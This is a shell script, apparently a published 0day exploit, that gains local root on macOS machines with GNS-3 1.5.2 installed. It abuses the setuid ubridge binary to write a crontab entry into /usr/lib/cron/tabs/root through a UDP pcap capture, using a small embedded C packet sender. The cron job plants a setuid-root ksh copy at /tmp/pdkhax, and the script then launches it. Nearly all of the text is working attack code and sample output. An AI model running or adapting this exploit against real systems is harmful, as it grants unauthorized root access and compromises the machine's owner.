#!/bin/sh
# GNS-3 Mac OS-X LPE local root exploit
# =====================================
# GNS-3 on OS-X bundles the "ubridge" binary as a setuid
# root file. This file can be used to read arbitary files
# using "-f" arguement but also as it runs as root can also
# write arbitrary files with "pcap_file" arguement within
# configuration ini file. It is possible to abuse this utility
# to also write arbitary contents by bridging a UDP tunnel
# and writing to disk. We can exploit these mishaps to gain
# root privileges on a host that has GNS-3 installed by
# writing a malicious crontab entry and escalating privileges.
# This exploit takes advantage of this flaw to overwrite
# root crontab with our own entry and to spawn a root shell.
# Don't forget to clean up in /usr/lib/spool/tabs and /tmp
# after running. Tested on GNS-3 version 1.5.2. The root user
# must have a crontab installed (even an empty one set with
# crontab -e) or the box rebooted after first attempt to get 
# commands to execute with this cron method.
#
# $ ./gns3super-osx.sh 
# [+] GNS-3 Mac OS-X local root LPE exploit 0day
# [-] creating ubridge.ini file...
# [-] Launching ubridge..
# [-] Preparing cron script...
# Parsing prdelka
# Creating UDP tunnel 40000:127.0.0.1:40001
# Creating UDP tunnel 50000:127.0.0.1:50001
# Starting packet capture to /usr/lib/cron/tabs/root with protocol (null)
# unknown link type (null), assuming Ethernet.
# Capturing to file '/usr/lib/cron/tabs/root'
# Source NIO listener thread for prdelka has started
# Destination NIO listener thread for prdelka has started
# [-] making magic packet client...
# [-] packet fired
# [-] Waiting a minute for the exploit magic...
# -rwsr-xr-x  1 root  wheel  1377872 Apr 12 23:32 /tmp/pdkhax
# [-] Got Root?
# # id
# uid=501(hackerfantastic) gid=20(staff) euid=0(root)
#  
# -- Hacker Fantastic (www.myhackerhouse.com)
echo "[+] GNS-3 Mac OS-X local root LPE exploit 0day"
echo "[-] creating ubridge.ini file..."
cat > ubridge.ini << EOF
[prdelka]
source_udp = 40000:127.0.0.1:40001
destination_udp = 50000:127.0.0.1:50001
pcap_file = "/usr/lib/cron/tabs/root"
EOF
echo "[-] Launching ubridge.."
/Applications/GNS3.app/Contents/Resources/ubridge &
echo "[-] Preparing cron script..."
cat > /tmp/pdk.sh << EOF
cp /bin/ksh /tmp/pdkhax
chown 0:0 /tmp/pdkhax
chmod 4755 /tmp/pdkhax
EOF
chmod 755 /tmp/pdk.sh
echo "[-] making magic packet client..."
cat > udphax.c << EOF
#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> 
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
 
int main(int argc, char* argv[]) {
    struct sockaddr_in si_other, srcaddr;
    int s, i, slen=sizeof(si_other);
    char* pkt = "\n* * * * * /tmp/pdk.sh\n\n";
    s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    memset((char *) &si_other, 0, sizeof(si_other));
    si_other.sin_family = AF_INET;
    si_other.sin_port = htons(50000);
    inet_aton("127.0.0.1", &si_other.sin_addr);
    srcaddr.sin_family = AF_INET;
    srcaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    srcaddr.sin_port = htons(50001);
    bind(s,(struct sockaddr *) &srcaddr, sizeof(srcaddr));
    sendto(s,pkt,strlen(pkt),0,(struct sockaddr *)&si_other, slen);
    printf("[-] packet fired\n");
}
EOF
gcc udphax.c -o udphax
./udphax
echo "[-] Waiting a minute for the exploit magic..."
rm -rf udphax* ubridge.ini
pkill ubridge
sleep 60
rm -rf /tmp/pdk.sh
ls -al /tmp/pdkhax
echo "[-] Got Root?"
/tmp/pdkhax